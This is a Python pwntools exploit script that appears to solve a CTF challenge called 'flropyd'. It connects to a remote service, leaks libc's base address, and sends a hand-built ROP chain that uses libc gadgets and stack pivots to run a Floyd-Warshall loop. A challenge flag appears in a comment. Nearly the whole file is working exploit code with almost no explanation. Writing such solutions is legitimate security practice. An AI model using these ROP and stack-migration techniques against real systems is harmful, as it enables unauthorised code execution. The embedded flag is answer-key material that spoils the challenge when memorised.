#!/usr/bin/env python
from pwn import *

# flag{for_k_in_N_for_i_in_N_for_j_in_N}

e , libc = ELF('./flropyd') , ELF('./libc-2.27.so')
context.arch = 'amd64'
host , port = '111.186.63.203' , 6666
y = remote( host , port )


y.recvuntil( '0x' )
libc.address = int( y.recvline()[:-1] , 16 ) - libc.sym.malloc
l = libc.address
success( 'libc -> %s' % hex( l ) )


ret = l + 0x8aa
pop_rax = l + 0x439c8
pop_rdi = l + 0x2155f
pop_rsi = l + 0x23e6a
pop_rdx = l + 0x1b96
pop_rbp = l + 0x21353
mov_rdx_rax = l + 0x1415dd # mov rdx, rax ; ret
mov_ptr_rdi_rsi = l + 0x54a5a
shr_rax_2 = l + 0xd09ea # shr rax, 2 ; ret
shr_al_1 = l + 0x159a07 # shr al, 1 ; ret
leave_ret = l + 0x54803
add_rax_rdi = l + 0xa8473 # add rax, rdi ; ret
sub_rax_rdi = l + 0xb17b8 # sub rax, rdi ; ret
add_rax_rsi = l + 0xac21c # add rax, rsi ; ret

g0 = l + 0x520e9 # mov rdi, qword ptr [rdi + 0x68] ; xor eax, eax ; ret
g3 = l + 0x3093c # mov qword ptr [rdx], rax ; ret
g6 = l + 0x1ab548 # shl dword ptr [rdi - 5], 1 ; ret
g7 = l + 0x145c98 # mov rax, qword ptr [rax] ; ret

jmp = l + 0x14e0a5 # jmp qword ptr [rdx + rax*8]

add_rsp_148 = l + 0x3ed8f # add rsp, 0x148 ; ret
add_rsp_418 = l + 0x11e7fd # add rsp, 0x418 ; ret


wd = 0x602060
mp = 0x602068
rop = 0x60A080

i  , j  , k  = 0x60a0a0 , 0x60a0a8 , 0x60a0b0
v1 , v2 , v3 = 0x60a0b8 , 0x60a0c0 , 0x60a0c8
a1 , a2 , a3 = 0x60a0d0 , 0x60a0d8 , 0x60a0e0

n = 0x60a0f8

br_tbl = 0x60a100

def store_long( addr , n ):
    return flat( pop_rdi , addr , pop_rsi , n , mov_ptr_rdi_rsi )

def add( dst , m1 , m2 , c = 0 ):        # [dst] = [m1] + [m2] or [dsr] = [m1] + m2
    p = flat( pop_rdi, m2 - 0x68, g0 )
    if c:
        p = flat( pop_rdi, m2 )
    p += flat(
            pop_rax, m1, g7,        # rax = [m1]
            add_rax_rdi,            # rax += rdi
            pop_rdx, dst, g3        # [dst] = rax
        )
    return p

def sub( dst , m1 , m2 , c = 0 ):        # [dst] = [m1] - [m2] or [dsr] = [m1] - m2
    p = flat( pop_rdi, m2 - 0x68, g0 )
    if c:
        p = flat( pop_rdi, m2 )
    p += flat(
            pop_rax, m1, g7,        # rax = [m1]
            sub_rax_rdi,            # rax -= rdi
            pop_rdx, dst, g3        # [dst] = rax
        )
    return p

def load( m1 , m2 ): # [m1] = [m2]
    return flat(
                pop_rax, m2, g7, # rax = [m2]
                pop_rdx, m1, g3  # [m1] = rax
            )

def shl( m1 , count ): # [m1] >>= count
    return flat(
                pop_rdi, m1 + 5,
                p64( g6 ) * count
            )

def read_map( dst , x , y ): # [dst] = map[x][y]
    return flat(
                load( v1 , x ),
                shl( v1 , 6 ), # x <<= 6
                add( v1 , v1 , y ), # [v1] = [v1] + [v2]
                shl( v1 , 3 ), # [v1] *= 8
                add( v1 , v1 , mp , c = 1 ), # mp[x][y]
                pop_rax, v1, g7, g7, # rax = mp[x][y]
                pop_rdx, dst, g3 # [dst] = mp[x][y]
            )

def store_map( x , y , m ): # map[x][y] = m
    return flat(
                load( v1 , x ),
                shl( v1 , 6 ), # x <<= 6
                add( v1 , v1 , y ), # [v1] = [v1] + [v2]
                shl( v1 , 3 ), # [v1] *= 8
                add( v1 , v1 , mp , c = 1 ), # [v1] = &mp[x][y]
                pop_rax, v1, g7, mov_rdx_rax, # rdx = &mp[x][y]
                pop_rax, m, g7, g3 # [&mp[x][y]] = [m]
            )

def br( m1 , m2 ): # branch if [m1] < [m2], if [m1] < [m2] jmp "ret", else jmp "add rsp, 0x418; ret"
    return flat(
                pop_rdi, m2 - 0x68, g0, # rdi = [m2]
                pop_rax, m1, g7,        # rax = [m1]
                sub_rax_rdi,            # rax -= rdi
                p64(shr_rax_2) * 31,
                shr_al_1,
                pop_rdx, br_tbl, jmp    # jmp br_tbl[0 or 1]
            )

def migrate( stack ): # stack mogration
    return flat(
                pop_rbp, stack - 8, leave_ret
            )


# 0x60A080
p = flat(
    0x666666, 0x20,
    0, add_rsp_148, # 0x60a090
    0, # 0x60a0a0 i
    0, # 0x60a0a8 j
    0, # 0x60a0b0 k

    0, # 0x60a0b8 a1
    0, # 0x60a0c0 a2
    0, # 0x60a0c8 a3

    0, # 0x60a0d0 b1
    0, # 0x60a0d8 b2
    0, # 0x60a0e0 b3

    0, # 0x60a0e8 b1
    0, # 0x60a0f0 b2
    0, # 0x60a0f8 n

    # 0x60a100
    # branch table
    #0x2222222, 0x1111111
    ret, add_rsp_418
)
p = p.ljust( 0x168 , '\0' )

p += flat(
    load( n , wd ),
    sub( n , n , 1 , c = 1 ),

    store_long( i , 0 ), # 0x60a260
    store_long( j , 0 ), # 0x60a288
    store_long( k , 0 ), # 0x60a2b0
                         # 0x60a2d8

    read_map( a1 , j , k ),
    read_map( a2 , j , i ),
    read_map( a3 , i , k ),
    add( a2 , a2 , a3 ),    # a1 = m[j][k] , a2 = m[j][i] + m[i][k]


    br( a1 , a2 ), #  m[j][k] < m[j][i] + m[i][k] branch
    store_map( j , k , a2 ), #m[j][k] = m[j][i] + m[i][k],
    p64(ret) * ( (0x418 - len( store_map(0,0,0) )) / 8 ),

    add( k , k , 1 , c = 1 ),
    br( n , k ),
    migrate( 0x60a2d8 ),
    p64(ret) * ( (0x418 - len( migrate(0) )) / 8 ),

    add( j , j , 1 , c = 1 ),
    br( n , j ),
    migrate( 0x60a2b0 ),
    p64(ret) * ( (0x418 - len( migrate(0) )) / 8 ),

    add( i , i , 1 , c = 1 ),
    br( n , i ),
    migrate( 0x60a288 ),
    p64(ret) * ( (0x418 - len( migrate(0) )) / 8 ),
)

y.sendafter( ':' , p.ljust( 0x10000 , '\0' ) )


y.interactive()